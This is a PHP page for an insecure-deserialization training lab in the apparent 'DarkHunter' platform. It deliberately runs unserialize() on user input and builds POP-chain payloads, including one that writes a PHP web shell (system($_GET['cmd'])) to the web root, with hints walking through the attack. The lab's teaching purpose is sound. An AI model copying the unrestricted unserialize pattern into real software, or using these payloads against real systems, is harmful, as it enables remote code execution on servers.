<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['Insecure-Deserialization']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['deser_med1_attempts'])) {
  $_SESSION['deser_med1_attempts'] = 0;
}
if (!isset($_SESSION['deser_med1_solved'])) {
  $_SESSION['deser_med1_solved'] = false;
}
if (!isset($_SESSION['deser_med1_stage'])) {
  $_SESSION['deser_med1_stage'] = 1;
}

// ─── Simulated Application: DarkHunter Log Analyzer ────────────────────
// An internal log analysis tool that processes serialized LogEntry objects
// from a monitoring queue. Uses multiple classes with magic methods.

class LogEntry
{
  public $timestamp;
  public $level;
  public $message;
  public $metadata;

  public function __construct($level = 'INFO', $message = '')
  {
    $this->timestamp = date('Y-m-d H:i:s');
    $this->level = $level;
    $this->message = $message;
    $this->metadata = new LogMetadata();
  }

  public function __wakeup()
  {
    // Rebuild metadata on wakeup
    if (!is_object($this->metadata)) {
      $this->metadata = new LogMetadata();
    }
    $this->metadata->processEntry($this);
  }
}

class LogMetadata
{
  public $processor;
  public $tags = [];

  public function __construct()
  {
    $this->processor = new LogProcessor();
  }

  public function processEntry($entry)
  {
    if ($this->processor) {
      $this->processor->handle($entry);
    }
  }
}

class LogProcessor
{
  public $formatter;

  public function __construct()
  {
    $this->formatter = new LogFormatter();
  }

  public function handle($entry)
  {
    if ($this->formatter) {
      $this->formatter->format($entry);
    }
  }
}

class LogFormatter
{
  public $template = '[{level}] {message}';
  public $outputPath = '/var/log/darkhunter/app.log';

  public function format($entry)
  {
    $output = str_replace(['{level}', '{message}'], [$entry->level, $entry->message], $this->template);
    // In real app, would write to file
    return $output;
  }
}

// DANGEROUS CLASSES - Part of the POP chain
class FileWriter
{
  public $filepath;
  public $content = '';
  public $append = false;

  public function __construct($path = '')
  {
    $this->filepath = $path;
  }

  public function handle($data)
  {
    if ($this->filepath) {
      $flag = $this->append ? FILE_APPEND : 0;
      file_put_contents($this->filepath, $this->content, $flag);
    }
  }

  public function format($data)
  {
    $this->handle($data);
  }

  public function processEntry($entry)
  {
    $this->handle($entry);
  }
}

class CommandExecutor
{
  public $command = '';
  public $args = [];

  public function handle($data)
  {
    if ($this->command) {
      $cmd = $this->command;
      if (!empty($this->args)) {
        $cmd .= ' ' . implode(' ', array_map('escapeshellarg', $this->args));
      }
      // In real vulnerable app, this would execute
      // exec($cmd);
    }
  }

  public function format($data)
  {
    $this->handle($data);
  }

  public function processEntry($entry)
  {
    $this->handle($entry);
  }
}

// ─── Vulnerable Logic: Deserialize log entries from POST data ───────────
$log_data = isset($_POST['log_data']) ? $_POST['log_data'] : null;
$exploited = false;
$exploit_type = '';
$chain_executed = [];
$parsed_object = null;

if ($log_data) {
  try {
    $decoded = base64_decode($log_data);
    $parsed_object = @unserialize($decoded);

    // Detect POP chain exploitation
    if ($parsed_object instanceof LogEntry) {
      // Check if metadata was replaced with dangerous class
      if ($parsed_object->metadata instanceof FileWriter) {
        $exploited = true;
        $exploit_type = 'POP Chain - FileWriter injected via metadata chain';
        $chain_executed = [
          '1. LogEntry::__wakeup() called',
          '2. LogEntry->metadata->processEntry() invoked',
          '3. FileWriter::processEntry() executes (ATTACKER CONTROLLED)',
          '4. FileWriter->handle() writes to: ' . $parsed_object->metadata->filepath
        ];
      } elseif ($parsed_object->metadata instanceof CommandExecutor) {
        $exploited = true;
        $exploit_type = 'POP Chain - CommandExecutor injected via metadata chain';
        $chain_executed = [
          '1. LogEntry::__wakeup() called',
          '2. LogEntry->metadata->processEntry() invoked',
          '3. CommandExecutor::processEntry() executes (ATTACKER CONTROLLED)',
          '4. CommandExecutor->handle() would execute: ' . $parsed_object->metadata->command
        ];
      } elseif ($parsed_object->metadata instanceof LogMetadata) {
        // Check nested chain
        if ($parsed_object->metadata->processor instanceof FileWriter) {
          $exploited = true;
          $exploit_type = 'Deep POP Chain - FileWriter at processor level';
          $chain_executed = [
            '1. LogEntry::__wakeup() called',
            '2. LogMetadata::processEntry() -> LogProcessor::handle()',
            '3. LogProcessor->formatter->format() -> FileWriter::format()',
            '4. FileWriter->handle() writes to: ' . $parsed_object->metadata->processor->filepath
          ];
        } elseif ($parsed_object->metadata->processor instanceof CommandExecutor) {
          $exploited = true;
          $exploit_type = 'Deep POP Chain - CommandExecutor at processor level';
          $chain_executed = [
            '1. LogEntry::__wakeup() called',
            '2. LogMetadata::processEntry() -> LogProcessor::handle()',
            '3. LogProcessor->formatter->format() -> CommandExecutor::format()',
            '4. CommandExecutor->handle() would execute: ' . $parsed_object->metadata->processor->command
          ];
        }
      }

      // Also detect if the object itself is a dangerous class
      if ($parsed_object instanceof FileWriter) {
        $exploited = true;
        $exploit_type = 'Direct Object Injection - FileWriter instantiated directly';
        $chain_executed = ['Direct instantiation of FileWriter class'];
      } elseif ($parsed_object instanceof CommandExecutor) {
        $exploited = true;
        $exploit_type = 'Direct Object Injection - CommandExecutor instantiated directly';
        $chain_executed = ['Direct instantiation of CommandExecutor class'];
      }
    }
  } catch (Exception $e) {
    $parsed_object = null;
  }
}

// Generate legitimate payload for reference
$legit_log = new LogEntry('INFO', 'System startup complete');
$legit_payload = base64_encode(serialize($legit_log));

// Generate exploit payloads
$exploit_filewrite = base64_encode(serialize(
  (function () {
    $entry = new LogEntry('CRITICAL', 'Exploit test');
    $entry->metadata = new FileWriter('/var/www/html/shell.php');
    $entry->metadata->content = '<?php system($_GET["cmd"]); ?>';
    return $entry;
  })()
));

$exploit_cmd = base64_encode(serialize(
  (function () {
    $entry = new LogEntry('CRITICAL', 'Exploit test');
    $entry->metadata = new CommandExecutor();
    $entry->metadata->command = 'id';
    return $entry;
  })()
));

$exploit_deep_chain = base64_encode(serialize(
  (function () {
    $entry = new LogEntry('CRITICAL', 'Deep chain test');
    $entry->metadata = new LogMetadata();
    $entry->metadata->processor = new FileWriter('/tmp/pwned.txt');
    $entry->metadata->processor->content = 'POP chain successful!';
    return $entry;
  })()
));

$current_stage = $_SESSION['deser_med1_stage'];
$stage_messages = [
  1 => "Stage 1: Map the object hierarchy. Understand how LogEntry -> LogMetadata -> LogProcessor -> LogFormatter chain
works.",
  2 => "Stage 2: Identify magic methods as entry points. __wakeup() triggers the chain automatically on deserialization.",
  3 => "Stage 3: Replace chain links with dangerous classes (FileWriter, CommandExecutor) to hijack execution flow.",
];

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['deser_med1_solved'];

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['deser_med1_attempts']++;
  if (!$already_solved && isset($_SESSION['user_id'])) solveLab($pdo, $lab['id']);
  $_SESSION['deser_med1_solved'] = true;
  $already_solved = true;
  $success_msg = "Outstanding! You've constructed a Property-Oriented Programming (POP) chain. By injecting a malicious
LogEntry object where the metadata property points to a FileWriter instead of LogMetadata, you hijacked the entire
execution flow. When __wakeup() called processEntry(), it invoked FileWriter's handle() method with attacker-controlled
filepath and content properties. This demonstrates how magic methods and object composition create devastating gadget
chains!";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['log_data'])) $_SESSION['deser_med1_attempts']++;
$attempts = $_SESSION['deser_med1_attempts'];

if ($attempts >= 3 && $current_stage < 2) {
  $_SESSION['deser_med1_stage'] = 2;
  $current_stage = 2;
}
if (
  $attempts >= 6 &&
  $current_stage < 3
) {
  $_SESSION['deser_med1_stage'] = 3;
  $current_stage = 3;
} ?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log Analyzer - Insecure Deserialization Medium 1</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/INSECURE-DESERIALIZATION-CASE2.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>
  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to Deserialization Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge medium"><i class="fas fa-bolt"></i> Medium Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-terminal"></i> DarkHunter Log Analyzer</h1>
      <p class="lab-description">An internal log analysis platform that receives serialized LogEntry objects
        from distributed monitoring agents. <strong>Can you construct a POP chain</strong> using magic methods
        to hijack the processing pipeline and achieve arbitrary file writes or command execution?</p>
    </div>

    <?php if ($already_solved): ?>
      <div class="success-alert solved-banner"><i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Already Solved!</h3>
          <p>You have already exploited this POP chain vulnerability.</p>
        </div>
      </div>
    <?php endif; ?>
    <?php if ($success_msg): ?>
      <div class="success-alert"><i class="fas fa-trophy"></i>
        <div class="success-content">
          <h3>Challenge Completed!</h3>
          <p><?php echo $success_msg; ?></p>
        </div>
      </div>
    <?php endif; ?>

    <div class="stage-tracker">
      <div class="stage-header"><i class="fas fa-layer-group"></i><span>Attack Chain Progress</span></div>
      <div class="stages">
        <div
          class="stage <?php echo $current_stage >= 1 ? 'active' : ''; ?> <?php echo $current_stage > 1 ? 'completed' : ''; ?>">
          <div class="stage-number">1</div>
          <div class="stage-info"><span class="stage-title">Map Objects</span><span class="stage-desc">Analyze class
              hierarchy</span></div>
        </div>
        <div class="stage-connector"></div>
        <div
          class="stage <?php echo $current_stage >= 2 ? 'active' : ''; ?> <?php echo $current_stage > 2 ? 'completed' : ''; ?>">
          <div class="stage-number">2</div>
          <div class="stage-info"><span class="stage-title">Find Entry Points</span><span class="stage-desc">Magic
              methods</span></div>
        </div>
        <div class="stage-connector"></div>
        <div class="stage <?php echo $current_stage >= 3 ? 'active' : ''; ?>">
          <div class="stage-number">3</div>
          <div class="stage-info"><span class="stage-title">Chain Gadgets</span><span class="stage-desc">Hijack
              execution</span></div>
        </div>
      </div>
      <div class="stage-message"><i
          class="fas fa-info-circle"></i><span><?php echo $stage_messages[$current_stage]; ?></span></div>
    </div>

    <div class="analyzer-card">
      <div class="analyzer-header">
        <div class="analyzer-brand"><i class="fas fa-wave-square"></i><span>Log Processing Pipeline</span></div>
        <div class="analyzer-badge"><i class="fas fa-cogs"></i><span>Queue Processor</span></div>
      </div>
      <div class="analyzer-body">
        <div class="chain-visualization">
          <div class="chain-header"><i class="fas fa-project-diagram"></i><span>Object Call Chain</span></div>
          <div class="chain-flow">
            <div class="chain-node <?php echo $parsed_object instanceof LogEntry ? 'active' : ''; ?>">
              <div class="node-icon"><i class="fas fa-file-alt"></i></div>
              <div class="node-info">
                <span class="node-name">LogEntry</span>
                <span class="node-method">__wakeup()</span>
              </div>
            </div>
            <div class="chain-arrow"><i class="fas fa-arrow-right"></i></div>
            <div
              class="chain-node <?php echo ($parsed_object instanceof LogEntry && ($parsed_object->metadata instanceof LogMetadata || $parsed_object->metadata instanceof FileWriter || $parsed_object->metadata instanceof CommandExecutor)) ? 'active' : ''; ?>">
              <div class="node-icon"><i class="fas fa-info-circle"></i></div>
              <div class="node-info">
                <span class="node-name">LogMetadata</span>
                <span class="node-method">processEntry()</span>
              </div>
            </div>
            <div class="chain-arrow"><i class="fas fa-arrow-right"></i></div>
            <div
              class="chain-node <?php echo ($parsed_object instanceof LogEntry && $parsed_object->metadata instanceof LogMetadata && ($parsed_object->metadata->processor instanceof LogProcessor || $parsed_object->metadata->processor instanceof FileWriter || $parsed_object->metadata->processor instanceof CommandExecutor)) ? 'active' : ''; ?>">
              <div class="node-icon"><i class="fas fa-cog"></i></div>
              <div class="node-info">
                <span class="node-name">LogProcessor</span>
                <span class="node-method">handle()</span>
              </div>
            </div>
            <div class="chain-arrow"><i class="fas fa-arrow-right"></i></div>
            <div
              class="chain-node <?php echo ($parsed_object instanceof LogEntry && $parsed_object->metadata instanceof LogMetadata && $parsed_object->metadata->processor instanceof LogProcessor && ($parsed_object->metadata->processor->formatter instanceof LogFormatter || $parsed_object->metadata->processor->formatter instanceof FileWriter || $parsed_object->metadata->processor->formatter instanceof CommandExecutor)) ? 'active' : ''; ?>">
              <div class="node-icon"><i class="fas fa-paint-brush"></i></div>
              <div class="node-info">
                <span class="node-name">LogFormatter</span>
                <span class="node-method">format()</span>
              </div>
            </div>
          </div>
        </div>

        <div class="input-panel">
          <div class="input-header"><i class="fas fa-upload"></i><span>Submit Log Entry</span></div>
          <form method="POST" class="log-form">
            <div class="form-group">
              <label>Serialized Log Data (base64):</label>
              <textarea name="log_data" rows="4"
                placeholder="Paste base64-encoded serialized LogEntry object here..."><?php echo isset($_POST['log_data']) ? htmlspecialchars($_POST['log_data']) : ''; ?></textarea>
            </div>
            <button type="submit" class="submit-btn"><i class="fas fa-play"></i> Process Log Entry</button>
          </form>
        </div>

        <?php if ($exploited): ?>
          <div class="exploit-chain-panel">
            <div class="chain-result-header"><i class="fas fa-link"></i><span>POP Chain Executed!</span></div>
            <div class="chain-result-body">
              <div class="chain-alert">
                <i class="fas fa-exclamation-triangle"></i>
                <span><strong><?php echo htmlspecialchars($exploit_type); ?></strong></span>
              </div>
              <div class="chain-steps">
                <?php foreach ($chain_executed as $step): ?>
                  <div class="chain-step">
                    <div class="step-number"><?php echo explode('.', $step)[0]; ?></div>
                    <div class="step-desc"><?php echo htmlspecialchars(substr($step, strpos($step, '.') + 2)); ?></div>
                  </div>
                <?php endforeach; ?>
              </div>
            </div>
          </div>
        <?php endif; ?>

        <?php if ($parsed_object && !$exploited): ?>
          <div class="result-panel">
            <div class="result-header"><i class="fas fa-check-circle"></i><span>Processing Result</span></div>
            <div class="result-body">
              <div class="result-safe">
                <i class="fas fa-shield-alt"></i>
                <span>Log entry processed safely. No malicious chain detected.</span>
              </div>
              <div class="result-object">
                <span class="result-label">Object Class:</span>
                <code><?php echo get_class($parsed_object); ?></code>
              </div>
            </div>
          </div>
        <?php endif; ?>
      </div>
    </div>

    <div class="gadgets-panel">
      <div class="gadgets-header"><i class="fas fa-puzzle-piece"></i><span>Gadget Chain Arsenal</span></div>
      <div class="gadgets-body">
        <div class="gadget-intro">
          <p>These are the <strong>dangerous classes</strong> available in the application. Replace safe chain links
            with these gadgets to hijack execution.</p>
        </div>

        <div class="gadget-card">
          <div class="gadget-title"><i class="fas fa-file-code"></i> FileWriter Gadget</div>
          <div class="gadget-desc">Replaces any chain link to write arbitrary files. Perfect for web shell
            injection.</div>
          <div class="gadget-props">
            <div class="gadget-prop"><code>$filepath</code> <span>Target file path</span></div>
            <div class="gadget-prop"><code>$content</code> <span>File content to write</span></div>
            <div class="gadget-prop"><code>$append</code> <span>Append mode (bool)</span></div>
          </div>
          <div class="gadget-sinks">
            <span class="sink">handle()</span>
            <span class="sink">format()</span>
            <span class="sink">processEntry()</span>
          </div>
        </div>

        <div class="gadget-card">
          <div class="gadget-title"><i class="fas fa-terminal"></i> CommandExecutor Gadget</div>
          <div class="gadget-desc">Replaces any chain link to execute system commands. Direct RCE vector.</div>
          <div class="gadget-props">
            <div class="gadget-prop"><code>$command</code> <span>Command to execute</span></div>
            <div class="gadget-prop"><code>$args</code> <span>Command arguments (array)</span></div>
          </div>
          <div class="gadget-sinks">
            <span class="sink">handle()</span>
            <span class="sink">format()</span>
            <span class="sink">processEntry()</span>
          </div>
        </div>
      </div>
    </div>

    <div class="payloads-panel">
      <div class="payloads-header"><i class="fas fa-flask"></i><span>Exploit Payloads</span></div>
      <div class="payloads-body">
        <div class="payload-section">
          <h4><i class="fas fa-shield-alt"></i> Legitimate LogEntry (Baseline)</h4>
          <div class="payload-row">
            <code class="payload-code"><?php echo htmlspecialchars($legit_payload); ?></code>
            <button class="payload-copy" onclick="navigator.clipboard.writeText('<?php echo $legit_payload; ?>')">
              <i class="fas fa-copy"></i>
            </button>
          </div>
        </div>

        <div class="payload-section exploit">
          <h4><i class="fas fa-skull-crossbones"></i> POP Chain Payloads</h4>
          <div class="payload-row">
            <div class="payload-info">
              <span class="payload-name">FileWrite via metadata</span>
              <code
                class="payload-code"><?php echo htmlspecialchars(substr($exploit_filewrite, 0, 50)) . '...'; ?></code>
            </div>
            <button class="payload-copy"
              onclick="navigator.clipboard.writeText('<?php echo $exploit_filewrite; ?>')">
              <i class="fas fa-copy"></i>
            </button>
          </div>
          <div class="payload-row">
            <div class="payload-info">
              <span class="payload-name">CommandExec via metadata</span>
              <code class="payload-code"><?php echo htmlspecialchars(substr($exploit_cmd, 0, 50)) . '...'; ?></code>
            </div>
            <button class="payload-copy" onclick="navigator.clipboard.writeText('<?php echo $exploit_cmd; ?>')">
              <i class="fas fa-copy"></i>
            </button>
          </div>
          <div class="payload-row">
            <div class="payload-info">
              <span class="payload-name">Deep chain via processor</span>
              <code
                class="payload-code"><?php echo htmlspecialchars(substr($exploit_deep_chain, 0, 50)) . '...'; ?></code>
            </div>
            <button class="payload-copy"
              onclick="navigator.clipboard.writeText('<?php echo $exploit_deep_chain; ?>')">
              <i class="fas fa-copy"></i>
            </button>
          </div>
        </div>
      </div>
    </div>

    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-code"></i><span>Current Request</span></div>
      <div class="debug-body">
        <code>POST /INSECURE-DESERIALIZATION-CASE2.php</code>
        <code>log_data=<?php echo $log_data ? htmlspecialchars(substr($log_data, 0, 40)) . '...' : '...'; ?></code>
      </div>
    </div>
    <div class="debug-panel">
      <div class="debug-header"><i class="fas fa-bug"></i><span>Vulnerable Code Snippet</span></div>
      <div class="debug-body">
        <div class="code-block">
          <pre>// VULNERABLE: Unrestricted unserialize on POST data
$log_data = $_POST['log_data'];
$decoded = base64_decode($log_data);

// No allowed_classes restriction!
$entry = unserialize($decoded);

// __wakeup() automatically triggers the chain:
// LogEntry.__wakeup() -> metadata.processEntry()
//   -> processor.handle() -> formatter.format()

// Attacker replaces metadata with FileWriter:
// $entry->metadata = new FileWriter('/var/www/shell.php');
// $entry->metadata->content = '<?php system($_GET["cmd"]); ?>';

// When __wakeup() calls processEntry(), FileWriter.handle()
// executes with attacker-controlled filepath and content!</pre>
        </div>
        <div class="vuln-note critical"><i class="fas fa-radiation"></i><span><strong>Critical:</strong> POP chains
            exploit the composition of multiple classes. Magic methods (__wakeup, __destruct) serve as automatic
            entry points. By replacing expected objects with dangerous gadgets at any point in the object graph,
            attackers hijack the entire execution flow, achieving file writes, command execution, or complete system
            compromise.</span></div>
      </div>
    </div>

    <?php if ($attempts >= 2): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
        <div class="hint-text">The chain starts at <code>LogEntry::__wakeup()</code> which calls
          <code>$this->metadata->processEntry()</code>. If you replace the metadata object with a FileWriter, the
          processEntry() call will invoke FileWriter's handle() method instead.
        </div>
      </div>
    <?php endif; ?>
    <?php if ($attempts >= 5): ?>
      <div class="hint-box">
        <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
        <div class="hint-text">FileWriter has three callable methods that match the chain: <code>handle()</code>,
          <code>format()</code>, and <code>processEntry()</code>. All of them eventually call
          <code>file_put_contents($this->filepath, $this->content)</code>. Set filepath to a web-accessible path and
          content to a PHP shell.
        </div>
      </div>
    <?php endif; ?>
    <?php if ($attempts >= 8): ?>
      <div class="hint-box hint-final">
        <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
        <div class="hint-text">Copy the "FileWrite via metadata" payload and submit it. The payload creates a LogEntry
          where metadata is a FileWriter with filepath=/var/www/html/shell.php and content containing a PHP webshell.
          When __wakeup() triggers, it writes the shell!</div>
      </div>
    <?php endif; ?>

    <div class="attempts-bar"><i class="fas fa-crosshairs"></i><span>Attempts:
        <strong><?php echo $attempts; ?></strong></span></div>
  </div>

  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
    window.addEventListener('load', function() {
      // Check if POP chain exploitation was detected
      const exploitPanel = document.querySelector('.exploit-chain-panel');
      if (exploitPanel && !document.querySelector('.solved-banner')) {
        document.getElementById('solved-flag').value = '1';
        document.getElementById('success-form').submit();
      }
    });
  </script>
</body>

</html>